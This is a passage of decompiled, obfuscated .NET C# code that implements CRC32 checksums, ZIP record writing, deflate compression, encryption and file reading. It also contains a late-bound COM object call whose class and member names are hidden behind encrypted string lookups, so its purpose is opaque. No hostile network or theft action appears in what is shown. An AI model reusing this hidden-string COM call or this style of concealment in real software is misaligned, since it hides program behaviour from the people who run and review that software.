                  997073096U,
                  1281953886U,
                  3579855332U,
                  2724688242U,
                  1006888145U,
                  1258607687U,
                  3524101629U,
                  2768942443U,
                  901097722U,
                  1119000684U,
                  3686517206U,
                  2898065728U,
                  853044451U,
                  1172266101U,
                  3705015759U,
                  2882616665U,
                  651767980U,
                  1373503546U,
                  3369554304U,
                  3218104598U,
                  565507253U,
                  1454621731U,
                  3485111705U,
                  3099436303U,
                  671266974U,
                  1594198024U,
                  3322730930U,
                  2970347812U,
                  795835527U,
                  1483230225U,
                  3244367275U,
                  3060149565U,
                  1994146192U,
                  31158534U,
                  2563907772U,
                  4023717930U,
                  1907459465U,
                  112637215U,
                  2680153253U,
                  3904427059U,
                  2013776290U,
                  251722036U,
                  2517215374U,
                  3775830040U,
                  2137656763U,
                  141376813U,
                  2439277719U,
                  3865271297U,
                  1802195444U,
                  476864866U,
                  2238001368U,
                  4066508878U,
                  1812370925U,
                  453092731U,
                  2181625025U,
                  4111451223U,
                  1706088902U,
                  314042704U,
                  2344532202U,
                  4240017532U,
                  1658658271U,
                  366619977U,
                  2362670323U,
                  4224994405U,
                  1303535960U,
                  984961486U,
                  2747007092U,
                  3569037538U,
                  1256170817U,
                  1037604311U,
                  2765210733U,
                  3554079995U,
                  1131014506U,
                  879679996U,
                  2909243462U,
                  3663771856U,
                  1141124467U,
                  855842277U,
                  2852801631U,
                  3708648649U,
                  1342533948U,
                  654459306U,
                  3188396048U,
                  3373015174U,
                  1466479909U,
                  544179635U,
                  3110523913U,
                  3462522015U,
                  1591671054U,
                  702138776U,
                  2966460450U,
                  3352799412U,
                  1504918807U,
                  783551873U,
                  3082640443U,
                  3233442989U,
                  3988292384U,
                  2596254646U,
                  62317068U,
                  1957810842U,
                  3939845945U,
                  2647816111U,
                  81470997U,
                  1943803523U,
                  3814918930U,
                  2489596804U,
                  225274430U,
                  2053790376U,
                  3826175755U,
                  2466906013U,
                  167816743U,
                  2097651377U,
                  4027552580U,
                  2265490386U,
                  503444072U,
                  1762050814U,
                  4150417245U,
                  2154129355U,
                  426522225U,
                  1852507879U,
                  4275313526U,
                  2312317920U,
                  282753626U,
                  1742555852U,
                  4189708143U,
                  2394877945U,
                  397917763U,
                  1622183637U,
                  3604390888U,
                  2714866558U,
                  953729732U,
                  1340076626U,
                  3518719985U,
                  2797360999U,
                  1068828381U,
                  1219638859U,
                  3624741850U,
                  2936675148U,
                  906185462U,
                  1090812512U,
                  3747672003U,
                  2825379669U,
                  829329135U,
                  1181335161U,
                  3412177804U,
                  3160834842U,
                  628085408U,
                  1382605366U,
                  3423369109U,
                  3138078467U,
                  570562233U,
                  1426400815U,
                  3317316542U,
                  2998733608U,
                  733239954U,
                  1555261956U,
                  3268935591U,
                  3050360625U,
                  752459403U,
                  1541320221U,
                  2607071920U,
                  3965973030U,
                  1969922972U,
                  40735498U,
                  2617837225U,
                  3943577151U,
                  1913087877U,
                  83908371U,
                  2512341634U,
                  3803740692U,
                  2075208622U,
                  213261112U,
                  2463272603U,
                  3855990285U,
                  2094854071U,
                  198958881U,
                  2262029012U,
                  4057260610U,
                  1759359992U,
                  534414190U,
                  2176718541U,
                  4139329115U,
                  1873836001U,
                  414664567U,
                  2282248934U,
                  4279200368U,
                  1711684554U,
                  285281116U,
                  2405801727U,
                  4167216745U,
                  1634467795U,
                  376229701U,
                  2685067896U,
                  3608007406U,
                  1308918612U,
                  956543938U,
                  2808555105U,
                  3495958263U,
                  1231636301U,
                  1047427035U,
                  2932959818U,
                  3654703836U,
                  1088359270U,
                  936918000U,
                  2847714899U,
                  3736837829U,
                  1202900863U,
                  817233897U,
                  3183342108U,
                  3401237130U,
                  1404277552U,
                  615818150U,
                  3134207493U,
                  3453421203U,
                  1423857449U,
                  601450431U,
                  3009837614U,
                  3294710456U,
                  1567103746U,
                  711928724U,
                  3020668471U,
                  3272380065U,
                  1510334235U,
                  755167117U
                };
                *(int*) ((IntPtr) voidPtr + 40) = -1;
                num1 = *(uint*) ((IntPtr) voidPtr + 40);
                num2 = 0;
                length = obj3.Length;
                while (--length >= 0)
                  num1 = numArray1[(IntPtr) (uint) (((int) num1 ^ (int) obj3[num2++]) & (int) byte.MaxValue)] ^ num1 >> 8;
                num1 ^= *(uint*) ((IntPtr) voidPtr + 40);
                \u0007.\u0001(67324752, obj4);
                \u0007.\u0001(20, obj4);
                if (true)
                {
                  \u0007.\u0001(0, obj4);
                  \u0007.\u0001(8, obj4);
                  \u0007.\u0001((int) *(long*) voidPtr, obj4);
                  \u0007.\u0001((int) num1, obj4);
                  *(long*) ((IntPtr) voidPtr + 8) = obj4.Position;
                  \u0007.\u0001(0, obj4);
                  \u0007.\u0001(obj3.Length, obj4);
                  bytes = Encoding.UTF8.GetBytes("{data}");
                  \u0007.\u0001(bytes.Length, obj4);
                  \u0007.\u0001(0, obj4);
                  obj4.Write(bytes, 0, bytes.Length);
                  \u0007.\u0001(obj5, obj3);
                  while (!\u0007.\u0001(obj5))
                  {
                    buffer1 = new byte[512];
                    *(int*) ((IntPtr) voidPtr + 44) = \u0007.\u0001(buffer1, obj5);
                    if (*(int*) ((IntPtr) voidPtr + 44) > 0)
                      obj4.Write(buffer1, 0, *(int*) ((IntPtr) voidPtr + 44));
                    else
                      break;
                  }
                  \u0007.\u0001(obj5);
                  while (!\u0007.\u0001(obj5))
                  {
                    buffer2 = new byte[512];
                    *(int*) ((IntPtr) voidPtr + 48) = \u0007.\u0001(buffer2, obj5);
                    if (*(int*) ((IntPtr) voidPtr + 48) > 0)
                      obj4.Write(buffer2, 0, *(int*) ((IntPtr) voidPtr + 48));
                    else
                      break;
                  }
                  *(long*) ((IntPtr) voidPtr + 16) = \u0007.\u0001(obj5);
                  \u0007.\u0001(33639248, obj4);
                  \u0007.\u0001(20, obj4);
                  \u0007.\u0001(20, obj4);
                  \u0007.\u0001(0, obj4);
                  \u0007.\u0001(8, obj4);
                }
                else
                  goto label_28;
              }
              while (false);
              \u0007.\u0001((int) *(long*) voidPtr, obj4);
              \u0007.\u0001((int) num1, obj4);
              \u0007.\u0001((int) *(long*) ((IntPtr) voidPtr + 16), obj4);
              \u0007.\u0001(obj3.Length, obj4);
              \u0007.\u0001(bytes.Length, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(0, obj4);
              obj4.Write(bytes, 0, bytes.Length);
              \u0007.\u0001(101010256, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(0, obj4);
              \u0007.\u0001(1, obj4);
              \u0007.\u0001(1, obj4);
              \u0007.\u0001(46 + bytes.Length, obj4);
              \u0007.\u0001((int) ((long) (30 + bytes.Length) + *(long*) ((IntPtr) voidPtr + 16)), obj4);
              \u0007.\u0001(0, obj4);
              do
              {
                obj4.Seek(*(long*) ((IntPtr) voidPtr + 8), SeekOrigin.Begin);
                \u0007.\u0001((int) *(long*) ((IntPtr) voidPtr + 16), obj4);
              }
              while (false);
              goto default;
            case 1:
              \u0007.\u0001(25000571, obj4);
              \u0007.\u0001(obj3.Length, obj4);
              *(int*) ((IntPtr) voidPtr + 52) = 0;
              while (*(int*) ((IntPtr) voidPtr + 52) < obj3.Length)
              {
                dst = new byte[Math.Min(2097151, obj3.Length - *(int*) ((IntPtr) voidPtr + 52))];
                Buffer.BlockCopy((Array) obj3, *(int*) ((IntPtr) voidPtr + 52), (Array) dst, 0, dst.Length);
                *(long*) ((IntPtr) voidPtr + 24) = obj4.Position;
                \u0007.\u0001(0, obj4);
                \u0007.\u0001(dst.Length, obj4);
                obj6 = new \u000F.\u0006.\u0006();
                \u0007.\u0001(obj6, dst);
                while (!\u0007.\u0001(obj6))
                {
                  buffer3 = new byte[512];
                  *(int*) ((IntPtr) voidPtr + 56) = \u0007.\u0001(buffer3, obj6);
                  if (*(int*) ((IntPtr) voidPtr + 56) > 0)
                    obj4.Write(buffer3, 0, *(int*) ((IntPtr) voidPtr + 56));
                  else
                    break;
                }
                \u0007.\u0001(obj6);
                while (!\u0007.\u0001(obj6))
                {
                  buffer4 = new byte[512];
                  *(int*) ((IntPtr) voidPtr + 60) = \u0007.\u0001(buffer4, obj6);
                  if (*(int*) ((IntPtr) voidPtr + 60) > 0)
                    obj4.Write(buffer4, 0, *(int*) ((IntPtr) voidPtr + 60));
                  else
                    break;
                }
                *(long*) ((IntPtr) voidPtr + 32) = obj4.Position;
                obj4.Position = *(long*) ((IntPtr) voidPtr + 24);
                \u0007.\u0001((int) \u0007.\u0001(obj6), obj4);
                obj4.Position = *(long*) ((IntPtr) voidPtr + 32);
                *(int*) ((IntPtr) voidPtr + 52) = *(int*) ((IntPtr) voidPtr + 52) + dst.Length;
              }
              goto default;
            case 2:
              \u0007.\u0001(41777787, obj4);
              break;
            case 3:
              \u0007.\u0001(58555003, obj4);
              inputBuffer2 = \u0007.\u0001((byte[]) null, (byte[]) null, 1, obj3);
              obj8 = new \u000F.\u0005();
              try
              {
                cryptoTransform2 = \u0007.\u0001(obj1, false, obj0, obj8);
                try
                {
                  buffer6 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                  obj4.Write(buffer6, 0, buffer6.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform2?.Dispose();
                }
              }
              finally
              {
                ((IDisposable) obj8)?.Dispose();
              }
            default:
label_46:
              obj4.Flush();
              obj4.Close();
              array = obj4.ToArray();
              goto label_52;
          }
label_28:
          inputBuffer1 = \u0007.\u0001((byte[]) null, (byte[]) null, 1, obj3);
          obj7 = new \u0008.\u0004();
          try
          {
            cryptoTransform1 = \u0007.\u0001(obj1, obj7, obj0, false);
            try
            {
              buffer5 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
              obj4.Write(buffer5, 0, buffer5.Length);
              goto label_46;
            }
            finally
            {
              cryptoTransform1?.Dispose();
            }
          }
          finally
          {
            ((IDisposable) obj7)?.Dispose();
          }
        }
        catch (Exception ex)
        {
          \u000F.\u0006.\u0001 = "ERR 2003: " + ex.Message;
          throw;
        }
label_52:
        return array;
      }
      catch (Exception ex)
      {
        byte[] numArray2;
        object[] objArray = new object[39]
        {
          (object) obj4,
          (object) obj5,
          (object) now,
          (object) *(long*) voidPtr,
          (object) numArray1,
          (object) *(uint*) ((IntPtr) voidPtr + 40),
          (object) num1,
          (object) num2,
          (object) length,
          (object) *(long*) ((IntPtr) voidPtr + 8),
          (object) bytes,
          (object) buffer1,
          (object) *(int*) ((IntPtr) voidPtr + 44),
          (object) buffer2,
          (object) *(int*) ((IntPtr) voidPtr + 48),
          (object) *(long*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 52),
          (object) dst,
          (object) *(long*) ((IntPtr) voidPtr + 24),
          (object) obj6,
          (object) buffer3,
          (object) *(int*) ((IntPtr) voidPtr + 56),
          (object) buffer4,
          (object) *(int*) ((IntPtr) voidPtr + 60),
          (object) *(long*) ((IntPtr) voidPtr + 32),
          (object) inputBuffer1,
          (object) obj7,
          (object) cryptoTransform1,
          (object) buffer5,
          (object) inputBuffer2,
          (object) obj8,
          (object) cryptoTransform2,
          (object) buffer6,
          (object) ex,
          (object) numArray2,
          (object) obj3,
          (object) obj2,
          (object) obj1,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static string \u0001() => \u000E.\u0003.\u0001(2029) + \u0007.\u0001();

    static string \u0001([In] string obj0)
    {
      StreamReader streamReader1;
      string str1;
      string str2;
      try
      {
        try
        {
          if (true)
          {
            streamReader1 = new StreamReader(obj0);
            if (true)
              str1 = streamReader1.ReadToEnd().ToString();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (true)
          {
            if (true)
              ProjectData.ClearProjectError();
          }
        }
        string str3 = str1;
        if (true)
          str2 = str3;
      }
      catch (Exception ex)
      {
        string str4 = str1;
        StreamReader streamReader2 = streamReader1;
        string str5 = obj0;
        \u0007.\u0001(ex, (object) str4, (object) streamReader2, (object) str5);
        throw;
      }
      return str2;
    }

    static unsafe int \u0001([In] byte[] obj0, [In] \u000F.\u0006.\u0006 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(26);
      try
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = obj0.Length;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 4);
        while (true)
        {
          do
          {
            \u000F.\u0006.\u0008 obj;
            do
            {
              *(int*) ((IntPtr) voidPtr + 12) = \u0007.\u0001(obj1.\u0001, obj0, *(int*) voidPtr, *(int*) ((IntPtr) voidPtr + 4));
              *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 12);
              obj1.\u0001 += (long) *(int*) ((IntPtr) voidPtr + 12);
              *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - *(int*) ((IntPtr) voidPtr + 12);
              if (*(int*) ((IntPtr) voidPtr + 4) != 0 && obj1.\u0001 != 30)
              {
                obj = obj1.\u0001;
                *(sbyte*) ((IntPtr) voidPtr + 24) = (sbyte) ((obj1.\u0001 & 4) != 0);
                *(sbyte*) ((IntPtr) voidPtr + 25) = (sbyte) ((obj1.\u0001 & 8) != 0);
              }
              else
                goto label_12;
            }
            while (\u0007.\u0001((bool) *(sbyte*) ((IntPtr) voidPtr + 24), (bool) *(sbyte*) ((IntPtr) voidPtr + 25), obj));
            if (obj1.\u0001 != 16)
            {
              if (obj1.\u0001 == 20)
                goto label_6;
            }
            else
              goto label_4;
          }
          while (obj1.\u0001 != 28);
          goto label_11;
label_6:
          *(int*) ((IntPtr) voidPtr + 16) = 8 + (-\u0007.\u0001(obj1.\u0001) & 7);
          while (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            \u0007.\u0001(obj1.\u0001, 2, 10);
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 10;
          }
          obj1.\u0001 = 16;
          continue;
label_11:
          \u0007.\u0001(obj1.\u0001);
          obj1.\u0001 = 30;
        }
label_4:
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 8) - *(int*) ((IntPtr) voidPtr + 4);
        goto label_15;
label_12:
        *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 8) - *(int*) ((IntPtr) voidPtr + 4);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u000F.\u0006.\u0006 obj = obj1;
        byte[] numArray = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj, (object) numArray);
        throw;
      }
label_15:
      return *(int*) ((IntPtr) voidPtr + 20);
    }

    static bool \u0001([In] \u0005.\u0004 obj0) => obj0.\u0001;

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8)
    {
      \u0007.\u0001(obj0, new object[8]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8
      });
    }

    static void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] \u000F.\u0006.\u0002 obj3)
    {
      int num1;
      try
      {
        if (false)
          goto label_10;
        else
          goto label_16;
label_1:
        int num2;
        int num3;
        if (num2 < num3)
          throw new InvalidOperationException();
        int num4 = obj1;
        int num5 = obj2;
        if (true)
          num1 = num4 + num5;
        else
          goto label_8;
label_4:
        int num6;
        if (0 <= obj1)
        {
          num2 = obj1;
          num3 = num1;
          if (true)
          {
            if (num2 <= num3)
            {
              int num7 = num1;
              if (true)
              {
                num5 = obj0.Length;
                num4 = num7;
              }
              else
              {
                num6 = num7;
                goto label_11;
              }
            }
            else
              goto label_9;
          }
          else
            goto label_1;
        }
        else
          goto label_9;
label_8:
        int num8 = num5;
        if (num4 <= num8)
          goto label_10;
label_9:
        throw new ArgumentOutOfRangeException();
label_10:
        num6 = obj2 & 1;
label_11:
        if (num6 != 0)
        {
          if (true)
          {
            obj3.\u0001 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << obj3.\u0003);
            obj3.\u0003 += 8;
          }
          else
            goto label_9;
        }
        obj3.\u0001 = obj0;
        obj3.\u0001 = obj1;
        if (true)
        {
          obj3.\u0002 = num1;
          return;
        }
        goto label_4;
label_16:
        int num9 = obj3.\u0001;
        num3 = obj3.\u0002;
        num2 = num9;
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u0002 obj = obj3;
        byte[] numArray = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) numArray, (object) local2, (object) local3);
        throw;
      }
    }

    static string \u0001([In] IntPtr obj0)
    {
      StringBuilder stringBuilder1;
      string str1;
      int num1;
      try
      {
        try
        {
          if (obj0.ToInt32() <= 0)
          {
            str1 = (string) null;
            if (false)
              goto label_4;
            else
              goto label_10;
          }
          else
            goto label_6;
label_3:
          str1 = (string) null;
label_4:
          if (false)
            goto label_3;
          else
            goto label_10;
label_6:
          num1 = \u0007.\u0001(obj0);
          int num2 = num1;
          int num3 = 0;
          if (num3 == 0)
          {
            if (num2 != num3)
            {
              int num4 = num1;
              num3 = 1;
              num2 = num4;
            }
            else
              goto label_3;
          }
          stringBuilder1 = new StringBuilder(checked (num2 + num3));
          \u0007.\u0001((int) obj0, stringBuilder1, stringBuilder1.Capacity);
          str1 = stringBuilder1.ToString().Trim();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (true)
            ProjectData.ClearProjectError();
        }
label_10:
        return str1;
      }
      catch (Exception ex)
      {
        string str2 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        StringBuilder stringBuilder2 = stringBuilder1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local2 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) str2, (object) local1, (object) stringBuilder2, (object) local2);
        throw;
      }
    }

    static void \u0001([In] \u000F.\u0006.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      int num1;
      try
      {
        do
        {
          while (true)
          {
            if (true)
            {
              if (true)
              {
                int num2 = obj2;
                int num3 = num2 - 1;
                if (true)
                  goto label_12;
label_3:
                obj1 = num2 & num3;
                continue;
label_12:
                obj2 = num3;
                if (num2 > 0)
                {
                  byte[] numArray = obj0.\u0001;
                  \u000F.\u0006.\u0003 obj = obj0;
                  int num4 = obj.\u0001;
                  if (true)
                    goto label_10;
label_1:
                  obj.\u0001 = num4 + 1;
                  int index = num1;
                  int num5 = (int) obj0.\u0001[obj1++];
                  numArray[index] = (byte) num5;
                  if (true)
                    obj0.\u0001 &= (int) short.MaxValue;
                  int num6 = obj1;
                  num3 = (int) short.MaxValue;
                  num2 = num6;
                  goto label_3;
label_10:
                  num1 = num4;
                  goto label_1;
                }
                else
                  break;
              }
              else
                break;
            }
            else
              goto label_0;
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj3;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2, (object) local3, (object) local4);
        throw;
      }
    }

    static unsafe bool \u0001([In] int obj0, [In] \u000F.\u0006.\u0008 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(23);
      int num1;
      int index;
      int num2;
      short[] numArray;
      try
      {
        num1 = 128;
        *(int*) voidPtr = 128;
        numArray = obj1.\u0002;
        index = obj1.\u0005;
        *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0005 + obj1.\u0003;
        *(int*) ((IntPtr) voidPtr + 8) = Math.Max(obj1.\u0003, 2);
        *(int*) ((IntPtr) voidPtr + 12) = Math.Max(obj1.\u0005 - 32506, 0);
        *(int*) ((IntPtr) voidPtr + 16) = obj1.\u0005 + 258 - 1;
        *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
        *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
        if (*(int*) ((IntPtr) voidPtr + 8) >= 8)
          num1 >>= 2;
        if (*(int*) voidPtr > obj1.\u0006)
          *(int*) voidPtr = obj1.\u0006;
        do
        {
          if ((int) obj1.\u0001[obj0 + *(int*) ((IntPtr) voidPtr + 8)] == (int) *(byte*) ((IntPtr) voidPtr + 21) && (int) obj1.\u0001[obj0 + *(int*) ((IntPtr) voidPtr + 8) - 1] == (int) *(byte*) ((IntPtr) voidPtr + 20) && (int) obj1.\u0001[obj0] == (int) obj1.\u0001[index])
          {
            while ((int) obj1.\u0001[obj0 + 1] == (int) obj1.\u0001[index + 1])
            {
              num2 = obj0 + 2;
              index += 2;
              do
                ;
              while ((int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && (int) obj1.\u0001[++index] == (int) obj1.\u0001[++num2] && index < *(int*) ((IntPtr) voidPtr + 16));
              if (index > *(int*) ((IntPtr) voidPtr + 4))
              {
                if (true)
                {
                  obj1.\u0002 = obj0;
                  *(int*) ((IntPtr) voidPtr + 4) = index;
                  *(int*) ((IntPtr) voidPtr + 8) = index - obj1.\u0005;
                  if (*(int*) ((IntPtr) voidPtr + 8) < *(int*) voidPtr)
                  {
                    *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
                    *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
                  }
                  else
                    goto label_15;
                }
                else
                  continue;
              }
              index = obj1.\u0005;
              break;
            }
          }
        }
        while ((obj0 = (int) numArray[obj0 & (int) short.MaxValue] & (int) ushort.MaxValue) > *(int*) ((IntPtr) voidPtr + 12) && --num1 != 0);
label_15:
        obj1.\u0003 = Math.Min(*(int*) ((IntPtr) voidPtr + 8), obj1.\u0006);
        *(sbyte*) ((IntPtr) voidPtr + 22) = (sbyte) (obj1.\u0003 >= 3);
      }
      catch (Exception ex)
      {
        object[] objArray = new object[13]
        {
          (object) num1,
          (object) *(int*) voidPtr,
          (object) numArray,
          (object) index,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(byte*) ((IntPtr) voidPtr + 20),
          (object) *(byte*) ((IntPtr) voidPtr + 21),
          (object) obj1,
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 22);
    }

    static unsafe int \u0001([In] \u000F.\u0006.\u0003 obj0, [In] \u000F.\u0006.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      try
      {
        int val1 = obj2;
        int val2_1 = 32768;
        if (val2_1 != 0)
        {
          int val2_2 = val2_1 - obj0.\u0002;
          int num = Math.Min(val1, val2_2);
          val2_1 = \u0007.\u0001(obj1);
          val1 = num;
        }
        int num1 = Math.Min(val1, val2_1);
        while (true)
        {
          obj2 = num1;
          int num2;
          do
          {
            *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
            num2 = obj2;
            if (true)
            {
              int num3 = *(int*) ((IntPtr) voidPtr + 4);
              if (num2 > num3)
                goto label_4;
            }
            else
              goto label_2;
          }
          while (false);
          goto label_7;
label_2:
          num1 = num2;
        }
label_4:
        *(int*) voidPtr = \u0007.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
        {
          *(int*) voidPtr = *(int*) voidPtr + \u0007.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
          goto label_8;
        }
        else
          goto label_8;
label_7:
        *(int*) voidPtr = \u0007.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
label_8:
        obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
        obj0.\u0002 += *(int*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u000F.\u0006.\u0003 obj3 = obj0;
        \u000F.\u0006.\u0002 obj4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) obj3, (object) obj4, (object) local3);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    static int \u0001([In] \u000F.\u0006.\u0002 obj0)
    {
      int num;
      try
      {
        num = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0002 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        \u0007.\u0001(obj0, new object[3]
        {
          obj1,
          obj2,
          obj3
        });
        goto label_2;
      }
      while (false);
    }

    static bool \u0001()
    {
      bool flag;
      try
      {
        do
        {
          if (true)
          {
            int num1 = \u0007.\u0001(89);
            int num2 = 0;
            if (num2 == 0)
            {
              int num3 = num1 == num2 ? 1 : 0;
              num2 = 0;
              num1 = num3;
            }
            flag = num1 == num2;
          }
        }
        while (false);
      }
      catch
      {
        if (true)
          flag = false;
      }
      return flag;
    }

    static string \u0001([In] string obj0)
    {
      object[] objArray1;
      object[] objArray2;
      bool[] flagArray1;
      object objectValue;
      try
      {
        string str;
        try
        {
          objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\u0007.\u0001(\u000E.\u0003.\u0001(2070), \u000E.\u0003.\u0001(55)), \u000E.\u0003.\u0001(13)));
          object Instance = objectValue;
          string MemberName = \u000E.\u0003.\u0001(2099);
          objArray1 = new object[1]{ (object) obj0 };
          objArray2 = objArray1;
          object[] Arguments = objArray2;
          flagArray1 = new bool[1]{ true };
          bool[] CopyBack = flagArray1;
          object obj = NewLateBinding.LateGet(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack);
          if (flagArray1[0])
            obj0 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (string));
          str = Conversions.ToString(obj);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return str;
      }
      catch (Exception ex)
      {
        string str1;
        string str2 = str1;
        object obj = objectValue;
        object[] objArray3 = objArray1;
        object[] objArray4 = objArray2;
        bool[] flagArray2 = flagArray1;
        string str3 = obj0;
        \u0007.\u0001(ex, (object) str2, obj, (object) objArray3, (object) objArray4, (object) flagArray2, (object) str3);
        throw;
      }
    }

    static int \u0001([In] \u0002.\u0003 obj0, [In] \u0002.\u0003.\u0003 obj1)
    {
      string upper = obj1.\u0001.\u0001.ToUpper();
      if (true)
      {
        int num1 = obj0.\u0002.ContainsKey(upper) ? 1 : 0;
        if (true)
        {
          if (num1 == 0)
            goto label_9;
          else
            goto label_8;
        }
        else
          goto label_6;
label_3:
        if (true)
        {
          int num2 = num1;
          obj0.\u0001.Add(obj1.\u0001);
          obj0.\u0002.Add(upper, num2);
          if (true)
            num1 = num2;
          else
            goto label_9;
        }
label_6:
        if (true)
          return num1;
        goto label_3;
label_9:
        num1 = obj0.\u0001.Count;
        goto label_3;
      }
label_8:
      return obj0.\u0002[upper];
    }

    static bool \u0001([In] byte[] obj0, [In] \u000E.\u0004.\u0003 obj1, [In] \u000E.\u0004 obj2)
    {
      byte[] numArray1;
